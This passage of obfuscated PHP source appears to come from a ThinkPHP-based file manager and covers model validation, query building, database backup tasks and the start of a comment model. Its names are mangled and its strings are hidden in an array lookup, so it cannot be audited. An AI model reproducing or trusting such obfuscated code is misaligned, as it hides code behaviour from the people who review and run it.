!$this->options[$İ¨·”àü[388]]) { return !0; } if (think_config($İ¨·”àü[385])) { $İÄ±ÍÆş = think_config($İ¨·”àü[386]); if (!isset($Íšëåú[$İÄ±ÍÆş]) || Session::get($İÄ±ÍÆş)) { return !1; } list($Ê¸ßşŒ, $ã¾Ü¦Çí) = explode($İ¨·”àü[11], $Íšëåú[$İÄ±ÍÆş]); if ($ã¾Ü¦Çí && Session::get($İÄ±ÍÆş . $İ¨·”àü[10] . $Ê¸ßşŒ) === $ã¾Ü¦Çí) { Session::remove($İÄ±ÍÆş . $İ¨·”àü[10] . $Ê¸ßşŒ); return !0; } if (think_config($İ¨·”àü[389])) { Session::remove($İÄ±ÍÆş . $İ¨·”àü[10] . $Ê¸ßşŒ); } return !1; } return !0; } public function regex($ˆ¥ÑÊ², $ƒÃÅÌ…Æ) { $„ìÎ­ËÕ =& $_SERVER[Ò°Ì”İ•]; $¤œÑÒó = array($„ìÎ­ËÕ[390] => $„ìÎ­ËÕ[391], $„ìÎ­ËÕ[392] => $„ìÎ­ËÕ[393], $„ìÎ­ËÕ[394] => $„ìÎ­ËÕ[395], $„ìÎ­ËÕ[396] => $„ìÎ­ËÕ[397], $„ìÎ­ËÕ[398] => $„ìÎ­ËÕ[399], $„ìÎ­ËÕ[400] => $„ìÎ­ËÕ[401], $„ìÎ­ËÕ[402] => $„ìÎ­ËÕ[403], $„ìÎ­ËÕ[377] => $„ìÎ­ËÕ[404], $„ìÎ­ËÕ[405] => $„ìÎ­ËÕ[406]); if (isset($¤œÑÒó[strtolower($ƒÃÅÌ…Æ)])) { $ƒÃÅÌ…Æ = $¤œÑÒó[strtolower($ƒÃÅÌ…Æ)]; } return preg_match($ƒÃÅÌ…Æ, $ˆ¥ÑÊ²) === 1; } private function autoOperation(&$Äãí•¯Å, $ñ®Ö»öÅ) { $¯ÛÍÇµÖ =& $_SERVER[Ò°Ì”İ•]; if (!empty($this->options[$¯ÛÍÇµÖ[407]])) { $’ÜÊ¸Á = $this->options[$¯ÛÍÇµÖ[407]]; unset($this->options[$¯ÛÍÇµÖ[407]]); } elseif (!empty($this->_auto)) { $’ÜÊ¸Á = $this->_auto; } if (isset($’ÜÊ¸Á)) { foreach ($’ÜÊ¸Á as $ÇÂï´€) { if (empty($ÇÂï´€[2])) { $ÇÂï´€[2] = THINK_MODEL_INSERT; } if ($ñ®Ö»öÅ == $ÇÂï´€[2] || $ÇÂï´€[2] == THINK_MODEL_BOTH) { switch (trim($ÇÂï´€[3])) { case $¯ÛÍÇµÖ[408]: case $¯ÛÍÇµÖ[409]: $âå¢‹ğ = isset($ÇÂï´€[4]) ? (array) $ÇÂï´€[4] : array(); if (isset($Äãí•¯Å[$ÇÂï´€[0]])) { array_unshift($âå¢‹ğ, $Äãí•¯Å[$ÇÂï´€[0]]); } if ($¯ÛÍÇµÖ[408] == $ÇÂï´€[3]) { $Äãí•¯Å[$ÇÂï´€[0]] = call_user_func_array($ÇÂï´€[1], $âå¢‹ğ); } else { $Äãí•¯Å[$ÇÂï´€[0]] = call_user_func_array(array(&$this, $ÇÂï´€[1]), $âå¢‹ğ); } break; case $¯ÛÍÇµÖ[362]: $Äãí•¯Å[$ÇÂï´€[0]] = $Äãí•¯Å[$ÇÂï´€[1]]; break; case $¯ÛÍÇµÖ[410]: if ($¯ÛÍÇµÖ[12] === $Äãí•¯Å[$ÇÂï´€[0]]) { unset($Äãí•¯Å[$ÇÂï´€[0]]); } break; case $¯ÛÍÇµÖ[411]: default: $Äãí•¯Å[$ÇÂï´€[0]] = $ÇÂï´€[1]; } if (!1 === $Äãí•¯Å[$ÇÂï´€[0]]) { unset($Äãí•¯Å[$ÇÂï´€[0]]); } } } } return $Äãí•¯Å; } protected function autoValidation($¨íÆêĞ¨, $¤­ÙÕÆû) { $µÎ…œÕ =& $_SERVER[Ò°Ì”İ•]; if (!empty($this->options[$µÎ…œÕ[412]])) { $ş›ˆøâÏ = $this->options[$µÎ…œÕ[412]]; unset($this->options[$µÎ…œÕ[412]]); } elseif (!empty($this->_validate)) { $ş›ˆøâÏ = $this->_validate; } if (isset($ş›ˆøâÏ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ş›ˆøâÏ as $òë¿¡²á => $¸óáåÌò) { if (empty($¸óáåÌò[5]) || $¸óáåÌò[5] == THINK_MODEL_BOTH || $¸óáåÌò[5] == $¤­ÙÕÆû) { if (0 == strpos($¸óáåÌò[2], $µÎ…œÕ[413]) && strpos($¸óáåÌò[2], $µÎ…œÕ[414])) { $¸óáåÌò[2] = think_lang(substr($¸óáåÌò[2], 2, -1)); } $¸óáåÌò[3] = isset($¸óáåÌò[3]) ? $¸óáåÌò[3] : THINK_EXISTS_VALIDATE; $¸óáåÌò[4] = isset($¸óáåÌò[4]) ? $¸óáåÌò[4] : $µÎ…œÕ[415]; switch ($¸óáåÌò[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¨íÆêĞ¨, $¸óáåÌò)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($µÎ…œÕ[12] != trim($¨íÆêĞ¨[$¸óáåÌò[0]])) { if (!1 === $this->_validationField($¨íÆêĞ¨, $¸óáåÌò)) { return !1; } } break; default: if (isset($¨íÆêĞ¨[$¸óáåÌò[0]])) { if (!1 === $this->_validationField($¨íÆêĞ¨, $¸óáåÌò)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Şô ¦Ò, $Ì÷Ôï€á) { if (!1 === $this->_validationFieldItem($Şô ¦Ò, $Ì÷Ôï€á)) { if ($this->patchValidate) { $this->error[$Ì÷Ôï€á[0]] = $Ì÷Ôï€á[2]; } else { $this->error = $Ì÷Ôï€á[2]; return !1; } } return; } protected function _validationFieldItem($ÆÏÑ¡ ¬, $£ŒˆŞæÊ) { $ñ³ú¥îÖ =& $_SERVER[Ò°Ì”İ•]; switch (strtolower(trim($£ŒˆŞæÊ[4]))) { case $ñ³ú¥îÖ[408]: case $ñ³ú¥îÖ[409]: $ÌÒ²É×· = isset($£ŒˆŞæÊ[6]) ? (array) $£ŒˆŞæÊ[6] : array(); if (is_string($£ŒˆŞæÊ[0]) && strpos($£ŒˆŞæÊ[0], $ñ³ú¥îÖ[50])) { $£ŒˆŞæÊ[0] = explode($ñ³ú¥îÖ[50], $£ŒˆŞæÊ[0]); } if (is_array($£ŒˆŞæÊ[0])) { foreach ($£ŒˆŞæÊ[0] as $Şá€â¸­) { $óİÊ³Îõ[$Şá€â¸­] = $ÆÏÑ¡ ¬[$Şá€â¸­]; } array_unshift($ÌÒ²É×·, $óİÊ³Îõ); } else { array_unshift($ÌÒ²É×·, $ÆÏÑ¡ ¬[$£ŒˆŞæÊ[0]]); } if ($ñ³ú¥îÖ[408] == $£ŒˆŞæÊ[4]) { return call_user_func_array($£ŒˆŞæÊ[1], $ÌÒ²É×·); } else { return call_user_func_array(array(&$this, $£ŒˆŞæÊ[1]), $ÌÒ²É×·); } case $ñ³ú¥îÖ[416]: return $ÆÏÑ¡ ¬[$£ŒˆŞæÊ[0]] == $ÆÏÑ¡ ¬[$£ŒˆŞæÊ[1]]; case $ñ³ú¥îÖ[417]: if (is_string($£ŒˆŞæÊ[0]) && strpos($£ŒˆŞæÊ[0], $ñ³ú¥îÖ[50])) { $£ŒˆŞæÊ[0] = explode($ñ³ú¥îÖ[50], $£ŒˆŞæÊ[0]); } $œ’µêæÅ = array(); if (is_array($£ŒˆŞæÊ[0])) { foreach ($£ŒˆŞæÊ[0] as $Şá€â¸­) { $œ’µêæÅ[$Şá€â¸­] = $ÆÏÑ¡ ¬[$Şá€â¸­]; } } else { $œ’µêæÅ[$£ŒˆŞæÊ[0]] = $ÆÏÑ¡ ¬[$£ŒˆŞæÊ[0]]; } if (!empty($ÆÏÑ¡ ¬[$this->getPk()])) { $œ’µêæÅ[$this->getPk()] = array($ñ³ú¥îÖ[418], $ÆÏÑ¡ ¬[$this->getPk()]); } if ($this->where($œ’µêæÅ)->find()) { return !1; } return !0; default: return $this->check($ÆÏÑ¡ ¬[$£ŒˆŞæÊ[0]], $£ŒˆŞæÊ[1], $£ŒˆŞæÊ[4]); } } public function check($Ù¸ÎÍ™ˆ, $—£¢ö», $áòîè©Ç = "\x72\145\x67\145\x78") { $©‚¹ô¤÷ =& $_SERVER[Ò°Ì”İ•]; $áòîè©Ç = strtolower(trim($áòîè©Ç)); switch ($áòîè©Ç) { case $©‚¹ô¤÷[7]: case $©‚¹ô¤÷[419]: $ Ğ¥ÂŸÈ = is_array($—£¢ö») ? $—£¢ö» : explode($©‚¹ô¤÷[50], $—£¢ö»); return $áòîè©Ç == $©‚¹ô¤÷[7] ? in_array($Ù¸ÎÍ™ˆ, $ Ğ¥ÂŸÈ) : !in_array($Ù¸ÎÍ™ˆ, $ Ğ¥ÂŸÈ); case $©‚¹ô¤÷[420]: case $©‚¹ô¤÷[421]: if (is_array($—£¢ö»)) { $Îïö¿é¼ = $—£¢ö»[0]; $‹ÜÉû‰ = $—£¢ö»[1]; } else { list($Îïö¿é¼, $‹ÜÉû‰) = explode($©‚¹ô¤÷[50], $—£¢ö»); } return $áòîè©Ç == $©‚¹ô¤÷[420] ? $Ù¸ÎÍ™ˆ >= $Îïö¿é¼ && $Ù¸ÎÍ™ˆ <= $‹ÜÉû‰ : $Ù¸ÎÍ™ˆ < $Îïö¿é¼ || $Ù¸ÎÍ™ˆ > $‹ÜÉû‰; case $©‚¹ô¤÷[422]: case $©‚¹ô¤÷[423]: return $áòîè©Ç == $©‚¹ô¤÷[422] ? $Ù¸ÎÍ™ˆ == $—£¢ö» : $Ù¸ÎÍ™ˆ != $—£¢ö»; case $©‚¹ô¤÷[424]: $‚Íüß”ã = mb_strlen($Ù¸ÎÍ™ˆ, $©‚¹ô¤÷[425]); if (strpos($—£¢ö», $©‚¹ô¤÷[50])) { list($Îïö¿é¼, $‹ÜÉû‰) = explode($©‚¹ô¤÷[50], $—£¢ö»); return $‚Íüß”ã >= $Îïö¿é¼ && $‚Íüß”ã <= $‹ÜÉû‰; } else { return $‚Íüß”ã == $—£¢ö»; } case $©‚¹ô¤÷[426]: list($ØÅ©è½¿, $‰¬‹ÆÑ) = explode($©‚¹ô¤÷[50], $—£¢ö»); if (!is_numeric($ØÅ©è½¿)) { $ØÅ©è½¿ = strtotime($ØÅ©è½¿); } if (!is_numeric($‰¬‹ÆÑ)) { $‰¬‹ÆÑ = strtotime($‰¬‹ÆÑ); } return NOW_TIME >= $ØÅ©è½¿ && NOW_TIME <= $‰¬‹ÆÑ; case $©‚¹ô¤÷[427]: return in_array(get_client_ip(), explode($©‚¹ô¤÷[50], $—£¢ö»)); case $©‚¹ô¤÷[428]: return !in_array(get_client_ip(), explode($©‚¹ô¤÷[50], $—£¢ö»)); case $©‚¹ô¤÷[415]: default: return $this->regex($Ù¸ÎÍ™ˆ, $—£¢ö»); } } public function query($¯‘Ù××ƒ, $ù‡ª·ş = false) { $Ç©ıÕİ¸ =& $_SERVER[Ò°Ì”İ•]; if (!is_bool($ù‡ª·ş) && !is_array($ù‡ª·ş)) { $ù‡ª·ş = func_get_args(); array_shift($ù‡ª·ş); } $¯‘Ù××ƒ = str_replace(array($Ç©ıÕİ¸[59], $Ç©ıÕİ¸[429]), $Ç©ıÕİ¸[53], $¯‘Ù××ƒ); $¯‘Ù××ƒ = $this->parseSql($¯‘Ù××ƒ, $ù‡ª·ş); return $this->db->query($¯‘Ù××ƒ); } public function execute($²ñ—«‹, $çô‘¨ø¨ = false) { if (!is_bool($çô‘¨ø¨) && !is_array($çô‘¨ø¨)) { $çô‘¨ø¨ = func_get_args(); array_shift($çô‘¨ø¨); } $²ñ—«‹ = $this->parseSql($²ñ—«‹, $çô‘¨ø¨); return $this->db->execute($²ñ—«‹); } protected function parseSql($şææĞ¾™, $÷¹¿®¼) { $Ğñ¦éíä =& $_SERVER[Ò°Ì”İ•]; if (!0 === $÷¹¿®¼) { $À›øãÉ´ = $this->_parseOptions(); $şææĞ¾™ = $this->db->parseSql($şææĞ¾™, $À›øãÉ´); } elseif (is_array($÷¹¿®¼)) { $÷¹¿®¼ = array_map(array($this->db, $Ğñ¦éíä[430]), $÷¹¿®¼); $şææĞ¾™ = vsprintf($şææĞ¾™, $÷¹¿®¼); } else { $şææĞ¾™ = strtr($şææĞ¾™, array($Ğñ¦éíä[431] => $this->getTableName(), $Ğñ¦éíä[432] => think_config($Ğñ¦éíä[333]))); } $this->db->setModel($this->name); return $şææĞ¾™; } public function db($Ñİµ˜×Õ = '', $¿óÀä€ø = '', $‰›©£¤ = array()) { $ïñ¤ğÊË =& $_SERVER[Ò°Ì”İ•]; if ($ïñ¤ğÊË[12] === $Ñİµ˜×Õ && $this->db) { return $this->db; } static $ğ§§†Äë = array(); static $¬¥ó½æã = array(); if (!isset($¬¥ó½æã[$Ñİµ˜×Õ]) || isset($¬¥ó½æã[$Ñİµ˜×Õ]) && $¿óÀä€ø && $ğ§§†Äë[$Ñİµ˜×Õ] != $¿óÀä€ø) { if (!empty($¿óÀä€ø) && is_string($¿óÀä€ø) && !1 === strpos($¿óÀä€ø, $ïñ¤ğÊË[8])) { $¿óÀä€ø = think_config($¿óÀä€ø); } $Ñİµ˜×Õ = think_guid($¿óÀä€ø); $¬¥ó½æã[$Ñİµ˜×Õ] = Db::getInstance($¿óÀä€ø); } elseif (NULL === $¿óÀä€ø) { $¬¥ó½æã[$Ñİµ˜×Õ]->close(); unset($¬¥ó½æã[$Ñİµ˜×Õ]); return; } if (!empty($‰›©£¤)) { if (is_string($‰›©£¤)) { parse_str($‰›©£¤, $‰›©£¤); } foreach ($‰›©£¤ as $Î·‡š•® => $÷èÏ…ª) { $this->setProperty($Î·‡š•®, $÷èÏ…ª); } } $ğ§§†Äë[$Ñİµ˜×Õ] = $¿óÀä€ø; $this->db = $¬¥ó½æã[$Ñİµ˜×Õ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $“Ó³ß°• = get_class($this); if ($“Ó³ß°• == $_SERVER[Ò°Ì”İ•][433]) { return $this->name; } $this->name = substr($“Ó³ß°•, 0, -5); } return $this->name; } public function getTableName() { $„²‘“ÅŞ =& $_SERVER[Ò°Ì”İ•]; if (empty($this->trueTableName)) { $ÖÓ¤ª‘Ü = !empty($this->tablePrefix) ? $this->tablePrefix : $„²‘“ÅŞ[12]; if (!empty($this->tableName)) { $ÖÓ¤ª‘Ü .= $this->tableName; } else { $ÖÓ¤ª‘Ü .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÖÓ¤ª‘Ü); } return (!empty($this->dbName) ? $this->dbName . $„²‘“ÅŞ[10] : $„²‘“ÅŞ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÓØøÉ¸× =& $_SERVER[Ò°Ì”İ•]; return isset($this->fields[$ÓØøÉ¸×[340]]) ? $this->fields[$ÓØøÉ¸×[340]] : $this->pk; } public function getDbFields() { $‹Í€»Í =& $_SERVER[Ò°Ì”İ•]; if (isset($this->options[$‹Í€»Í[368]])) { $ëëûƒÌ = $this->db->getFields($this->options[$‹Í€»Í[368]]); return $ëëûƒÌ ? array_keys($ëëûƒÌ) : !1; } if ($this->fields) { $ëëûƒÌ = $this->fields; unset($ëëûƒÌ[$‹Í€»Í[339]], $ëëûƒÌ[$‹Í€»Í[340]], $ëëûƒÌ[$‹Í€»Í[341]], $ëëûƒÌ[$‹Í€»Í[338]]); return $ëëûƒÌ; } return !1; } public function data($”õ‹‡ = '') { $—¼Îû› =& $_SERVER[Ò°Ì”İ•]; if ($—¼Îû›[12] === $”õ‹‡ && !empty($this->data)) { return $this->data; } if (is_object($”õ‹‡)) { $”õ‹‡ = get_object_vars($”õ‹‡); } elseif (is_string($”õ‹‡)) { parse_str($”õ‹‡, $”õ‹‡); } elseif (!is_array($”õ‹‡)) { think_exception(think_lang($—¼Îû›[360])); } $this->data = $”õ‹‡; return $this; } public function join($’´âÖ“å) { $ÚÍß†ÓÍ =& $_SERVER[Ò°Ì”İ•]; if (is_array($’´âÖ“å)) { $this->options[$ÚÍß†ÓÍ[371]] = $’´âÖ“å; } elseif (!empty($’´âÖ“å)) { $this->options[$ÚÍß†ÓÍ[371]][] = $’´âÖ“å; } return $this; } public function union($Õû®´‘ù, $––²¬© = false) { $ï“¯¸ªú =& $_SERVER[Ò°Ì”İ•]; if (empty($Õû®´‘ù)) { return $this; } if ($––²¬©) { $this->options[$ï“¯¸ªú[434]][$ï“¯¸ªú[435]] = !0; } if (is_object($Õû®´‘ù)) { $Õû®´‘ù = get_object_vars($Õû®´‘ù); } if (is_string($Õû®´‘ù)) { $ó§´¯‹ = $Õû®´‘ù; } elseif (is_array($Õû®´‘ù)) { if (isset($Õû®´‘ù[0])) { $this->options[$ï“¯¸ªú[434]] = array_merge($this->options[$ï“¯¸ªú[434]], $Õû®´‘ù); return $this; } else { $ó§´¯‹ = $Õû®´‘ù; } } else { think_exception(think_lang($ï“¯¸ªú[360])); } $this->options[$ï“¯¸ªú[434]][] = $ó§´¯‹; return $this; } public function cache($×ï…ÂŠå = true, $­Şê­ş = null, $Ÿ‹ğí÷Ö = '') { $¶œ·ùš =& $_SERVER[Ò°Ì”İ•]; if (!1 !== $×ï…ÂŠå) { $this->options[$¶œ·ùš[436]] = array($¶œ·ùš[108] => $×ï…ÂŠå, $¶œ·ùš[426] => $­Şê­ş, $¶œ·ùš[33] => $Ÿ‹ğí÷Ö); } return $this; } public function field($Ï¯ÈãË˜, $º«üô¨ = false) { $ÓõãÈš =& $_SERVER[Ò°Ì”İ•]; if (!0 === $Ï¯ÈãË˜) { $ËŠÓš·£ = $this->getDbFields(); $Ï¯ÈãË˜ = $ËŠÓš·£ ? $ËŠÓš·£ : $ÓõãÈš[233]; } elseif ($º«üô¨) { if (is_string($Ï¯ÈãË˜)) { $Ï¯ÈãË˜ = explode($ÓõãÈš[50], $Ï¯ÈãË˜); } $ËŠÓš·£ = $this->getDbFields(); $Ï¯ÈãË˜ = $ËŠÓš·£ ? array_diff($ËŠÓš·£, $Ï¯ÈãË˜) : $Ï¯ÈãË˜; } $this->options[$ÓõãÈš[362]] = $Ï¯ÈãË˜; return $this; } public function scope($Û°§Š€Í = '', $–Úœ¼Ä› = NULL) { $ÑŠ“õöè =& $_SERVER[Ò°Ì”İ•]; if ($ÑŠ“õöè[12] === $Û°§Š€Í) { if (isset($this->_scope[$ÑŠ“õöè[37]])) { $‚Œ…ôî = $this->_scope[$ÑŠ“õöè[37]]; } else { return $this; } } elseif (is_string($Û°§Š€Í)) { $Õ¢ÔÇ£€ = explode($ÑŠ“õöè[50], $Û°§Š€Í); $‚Œ…ôî = array(); foreach ($Õ¢ÔÇ£€ as $æ‘óş†¤) { if (!isset($this->_scope[$æ‘óş†¤])) { continue; } $‚Œ…ôî = array_merge($‚Œ…ôî, $this->_scope[$æ‘óş†¤]); } if (!empty($–Úœ¼Ä›) && is_array($–Úœ¼Ä›)) { $‚Œ…ôî = array_merge($‚Œ…ôî, $–Úœ¼Ä›); } } elseif (is_array($Û°§Š€Í)) { $‚Œ…ôî = $Û°§Š€Í; } if (is_array($‚Œ…ôî) && !empty($‚Œ…ôî)) { $this->options = array_merge($this->options, array_change_key_case($‚Œ…ôî)); } return $this; } public function where($‡âæ©·, $„®³Êé = null) { $”Ûğ©ğ˜ =& $_SERVER[Ò°Ì”İ•]; if (!is_null($„®³Êé) && is_string($‡âæ©·)) { if (!is_array($„®³Êé)) { $„®³Êé = func_get_args(); array_shift($„®³Êé); } $„®³Êé = array_map(array($this->db, $”Ûğ©ğ˜[430]), $„®³Êé); $‡âæ©· = vsprintf($‡âæ©·, $„®³Êé); } elseif (is_object($‡âæ©·)) { $‡âæ©· = get_object_vars($‡âæ©·); } elseif (is_array($‡âæ©·)) { foreach ($‡âæ©· as $ûº†ìúª => $™Ô™°×) { if ((is_numeric($ûº†ìúª) || !$ûº†ìúª) && is_string($™Ô™°×)) { if (strpos($™Ô™°×, $”Ûğ©ğ˜[437]) === 0) { continue; } think_trace($”Ûğ©ğ˜[438], $”Ûğ©ğ˜[12], $”Ûğ©ğ˜[49]); die; } } } if (is_string($‡âæ©·) && $”Ûğ©ğ˜[12] != $‡âæ©·) { $ôÁ„£ê• = array(); $ôÁ„£ê•[$”Ûğ©ğ˜[439]] = $‡âæ©·; $‡âæ©· = $ôÁ„£ê•; } if (isset($this->options[$”Ûğ©ğ˜[364]])) { $this->options[$”Ûğ©ğ˜[364]] = array_merge($this->options[$”Ûğ©ğ˜[364]], $‡âæ©·); } else { $this->options[$”Ûğ©ğ˜[364]] = $‡âæ©·; } return $this; } public function limit($ó¾…å™, $¹Šß»® = null) { $é„“‡ÔÚ =& $_SERVER[Ò°Ì”İ•]; $this->options[$é„“‡ÔÚ[379]] = is_null($¹Šß»®) ? $ó¾…å™ : $ó¾…å™ . $é„“‡ÔÚ[50] . $¹Šß»®; return $this; } public function page($×·öÕËÏ, $š…å¨óã = null) { $Î‰Üäà‹ =& $_SERVER[Ò°Ì”İ•]; $this->options[$Î‰Üäà‹[440]] = is_null($š…å¨óã) ? $×·öÕËÏ : $×·öÕËÏ . $Î‰Üäà‹[50] . $š…å¨óã; return $this; } public function comment($À€‘ÎÒ’) { $this->options[$_SERVER[Ò°Ì”İ•][441]] = $À€‘ÎÒ’; return $this; } public function setProperty($¤üş±ñ, $’µàñ²ú) { if (property_exists($this, $¤üş±ñ)) { $this->{$¤üş±ñ} = $’µàñ²ú; } return $this; } } goto A”Õ¼Ô·–Á; A‹ùÑÊ±¥: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x62\x61\x63\153\165\x70\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\141\x6d\145", "\163\164\141\164\x75\x73", "\x63\157\x6e\164\x65\156\164", "\x6d\x61\x6e\x75\141\x6c", "\x72\145\163\165\x6c\164", "\x74\x69\x6d\145\106\162\157\x6d", "\x74\151\x6d\145\x54\x6f"); public function config() { $ñ³Ø¥— =& $_SERVER[Ò°Ì”İ•]; Action($ñ³Ø¥—[1994])->taskInit(); $Â‡ƒ“¬ƒ = Model($ñ³Ø¥—[843])->get($ñ³Ø¥—[857]); $Â‡ƒ“¬ƒ = json_decode($Â‡ƒ“¬ƒ, !0); $Â‡ƒ“¬ƒ = is_array($Â‡ƒ“¬ƒ) ? $Â‡ƒ“¬ƒ : array(); $this->parseContent($Â‡ƒ“¬ƒ); unset($Â‡ƒ“¬ƒ[$ñ³Ø¥—[1737]]); Model($ñ³Ø¥—[1736])->cacheClear(); $›¡¦‚á… = $ñ³Ø¥—[1995]; $òÅ¦İå = Model($ñ³Ø¥—[1996])->findByKey($ñ³Ø¥—[1755], $›¡¦‚á…); if (!$òÅ¦İå) { $òÅ¦İå = array(); } if (isset($òÅ¦İå[$ñ³Ø¥—[217]])) { $òÅ¦İå[$ñ³Ø¥—[217]] = json_decode($òÅ¦İå[$ñ³Ø¥—[217]], !0); } if (isset($Â‡ƒ“¬ƒ[$ñ³Ø¥—[217]])) { $òÅ¦İå[$ñ³Ø¥—[217]][$ñ³Ø¥—[1740]] = $Â‡ƒ“¬ƒ[$ñ³Ø¥—[217]]; unset($Â‡ƒ“¬ƒ[$ñ³Ø¥—[217]]); } return array_merge($òÅ¦İå, $Â‡ƒ“¬ƒ); } public function listData($©´·Ú°ı = false, $¥²– Ù¥ = "\155\x6f\x64\151\x66\x79\124\151\155\145", $ö”Ê†Òõ = false) { $ø²é‰ß = parent::listData($©´·Ú°ı, $¥²– Ù¥, !0); if (!$ø²é‰ß) { return $ø²é‰ß; } if ($©´·Ú°ı) { $ø²é‰ß = array($ø²é‰ß); } foreach ($ø²é‰ß as &$œçµÉª¦) { $this->parseContent($œçµÉª¦); } return $©´·Ú°ı ? $ø²é‰ß[0] : $ø²é‰ß; } public function parseContent(&$¨Å›Œğ—) { $í ÑàóÎ =& $_SERVER[Ò°Ì”İ•]; $´€—ÒŸß = _get($¨Å›Œğ—, $í ÑàóÎ[182], $í ÑàóÎ[102]); if (!in_array($´€—ÒŸß, array($í ÑàóÎ[849], $í ÑàóÎ[1205]))) { $¨Å›Œğ—[$í ÑàóÎ[182]] = $´€—ÒŸß == $í ÑàóÎ[102] ? $í ÑàóÎ[1205] : $í ÑàóÎ[849]; } } public function lastItem() { $äã›¶Âé = $this->listData(); return !empty($äã›¶Âé[0]) ? $äã›¶Âé[0] : null; } public function kill($¢ƒ£ˆ’ƒ) { $í¡×Å— =& $_SERVER[Ò°Ì”İ•]; $¬©„–Üø = $this->listData($¢ƒ£ˆ’ƒ); if (!$¬©„–Üø || empty($¬©„–Üø[$í¡×Å—[32]])) { return !0; } Task::kill($í¡×Å—[856]); Task::kill($í¡×Å—[874]); Task::kill($í¡×Å—[883]); $ÖÚù®öŒ = $¬©„–Üø[$í¡×Å—[32]]; $Ûšàö« = TEMP_FILES . $í¡×Å—[852] . $ÖÚù®öŒ . $í¡×Å—[8]; IO::remove($Ûšàö«, !1); return $this->remove($¢ƒ£ˆ’ƒ); } public function remove($‹˜µïºı) { $üãİÒ¬ = $this->listData($‹˜µïºı); if (!$üãİÒ¬) { return !0; } return $this->backupRemove($üãİÒ¬); } private function backupRemove($ó¹ÊÊÏ“) { parent::remove($ó¹ÊÊÏ“[$_SERVER[Ò°Ì”İ•][487]]); $ı¢Õòôä = $this->backupPath($ó¹ÊÊÏ“); IO::remove($ı¢Õòôä, !1); return !0; } private function backupPath($ûİÜõ¾‚) { $–‹»®®« =& $_SERVER[Ò°Ì”İ•]; $ÌóšÍ¡ = $ûİÜõ¾‚[$–‹»®®«[32]]; $ ²Ëİ  = Model($–‹»®®«[843])->get($–‹»®®«[844]); $è‡ƒ‹ô = substr(md5($–‹»®®«[845] . $ ²Ëİ  . $ÌóšÍ¡), 0, 8); return "\173\151\157\72{$ûİÜõ¾‚[$–‹»®®«[825]]}\175\x2f\144\141\164\141\x62\x61\163\x65\57\142\x61\x63\x6b\x75\160\57" . $ÌóšÍ¡ . $–‹»®®«[11] . $è‡ƒ‹ô; } public function start() { $­óóŸ§Å =& $_SERVER[Ò°Ì”İ•]; if ($GLOBALS[$­óóŸ§Å[6]][$­óóŸ§Å[103]][$­óóŸ§Å[1997]] != $­óóŸ§Å[102]) { return !0; } $§…‡÷°ú = $this->config(); if (!$§…‡÷°ú || $§…‡÷°ú[$­óóŸ§Å[1737]] != $­óóŸ§Å[102]) { return !1; } if ($§…‡÷°ú[$­óóŸ§Å[182]] == $­óóŸ§Å[849]) { $µá§´äÜ = Model($­óóŸ§Å[843])->get($­óóŸ§Å[1320]); if ($µá§´äÜ == $­óóŸ§Å[1321]) { $§…‡÷°ú[$­óóŸ§Å[182]] = $­óóŸ§Å[1205]; } } $ïÓ”ş¾É = $this->process(); foreach ($ïÓ”ş¾É as $™ä›œ) { if ($™ä›œ) { return Task::restart($™ä›œ[$­óóŸ§Å[487]]); } } $Êß¤Ûıû = new Backup(); $àÙïÄì = $Êß¤Ûıû->db(); if ($àÙïÄì) { $àÙïÄì = $Êß¤Ûıû->dbFile(); if ($àÙïÄì && $§…‡÷°ú[$­óóŸ§Å[182]] == $­óóŸ§Å[849]) { $àÙïÄì = $Êß¤Ûıû->file(); } } Backup::set(array($­óóŸ§Å[823] => 1, $­óóŸ§Å[834] => time())); return !0; } public function process() { $°Şç‡ê½ =& $_SERVER[Ò°Ì”İ•]; $ŞƒÈ¬¯û = array($°Şç‡ê½[830] => Task::get($°Şç‡ê½[856]), $°Şç‡ê½[835] => Task::get($°Şç‡ê½[874]), $°Şç‡ê½[243] => Task::get($°Şç‡ê½[883])); $§Æ×ôò½ = !1; foreach ($ŞƒÈ¬¯û as &$ÑÄ¨“ö) { if ($§Æ×ôò½) { $ÑÄ¨“ö = !1; continue; } if ($ÑÄ¨“ö) { $ËÏÕş÷ó = intval(_get($ÑÄ¨“ö, $°Şç‡ê½[1773], 0)); if (time() - $ËÏÕş÷ó > 7200) { Task::kill($ÑÄ¨“ö[$°Şç‡ê½[487]]); $§Æ×ôò½ = !0; $ÑÄ¨“ö = !1; } } } return $ŞƒÈ¬¯û; } public function restore() { $§¹ÔÍÆº =& $_SERVER[Ò°Ì”İ•]; ActionCall($§¹ÔÍÆº[1133], !0, 1); ActionCall($§¹ÔÍÆº[1133], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\164"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\143\157\155\x6d\145\x6e\164\137\155\145\164\141", "\155\145\x74\x61\106\151\145\154\144" => "\143\157\155\155\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($´È…Ëé) { $ê¿ëÓäˆ =& $_SERVER[Ò°Ì”İ•]; if ($´È…Ëé[$ê¿ëÓäˆ[1998]]) { $ËÏíÃº = $this->where(array($ê¿ëÓäˆ[1999] => $´È…Ëé[$ê¿ëÓäˆ[1998]]))->find(); if (!$ËÏíÃº || $ËÏíÃº[$ê¿ëÓäˆ[201]] 